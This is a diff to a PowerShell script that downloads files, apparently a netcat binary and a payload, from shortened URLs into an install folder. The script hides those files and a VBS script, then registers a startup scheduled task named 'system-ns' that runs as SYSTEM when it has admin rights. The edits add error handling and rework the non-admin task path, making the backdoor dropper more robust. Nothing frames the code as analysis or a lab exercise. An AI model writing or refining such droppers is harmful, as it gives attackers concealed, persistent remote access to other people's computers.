@@ -20,7 +20,12 @@ if ($isAdmin) {
 
 # Create the installation directory if it doesn't exist
 if (-not (Test-Path $installPath)) {
-    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
+    try {
+        New-Item -ItemType Directory -Path $installPath -Force | Out-Null
+    } catch {
+        Write-Output "Failed to create directory: $_"
+        exit
+    }
 }
 
 # File download paths
@@ -32,7 +37,7 @@ $scriptVbsPath = Join-Path $installPath "script.vbs"
 $quietTxtUrl = "https://rb.gy/mx0i5"
 $nc64TxtUrl = "https://rb.gy/guty9"
 
-# Download files with error handling
+# Download files
 try {
     Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
     Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
@@ -43,17 +48,21 @@ try {
 }
 
 # Make the downloaded files hidden
-attrib +H $quietTxtPath
-attrib +H $nc64TxtPath
-attrib +H $scriptVbsPath
-
-# Create a scheduled task
-$action = New-ScheduledTaskAction -Execute $scriptVbsPath
-$trigger = New-ScheduledTaskTrigger -AtStartup
-
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
-
 try {
+    attrib +H $quietTxtPath
+    attrib +H $nc64TxtPath
+    attrib +H $scriptVbsPath
+} catch {
+    Write-Output "Failed to hide files: $_"
+    exit
+}
+
+# Create a scheduled task to run script.vbs at startup
+try {
+    $action = New-ScheduledTaskAction -Execute $scriptVbsPath
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+
     if ($isAdmin) {
         # If admin rights, run as NT AUTHORITY\SYSTEM
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
@@ -61,12 +70,9 @@ try {
         # Register the task with SYSTEM account
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
     } else {
-        # If not admin, run as current user with limited privileges
-        $currentUser = "$env:USERDOMAIN\$env:USERNAME"
-        $action = "schtasks /create /tn system-ns /tr $scriptVbsPath /sc onstart /rl limited /f"
-        Invoke-Expression $action
+        # If not admin, use your method to create the task
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "YourTaskName" -Settings $settings
     }
 } catch {
     Write-Output "Failed to register scheduled task: $_"
 }
-
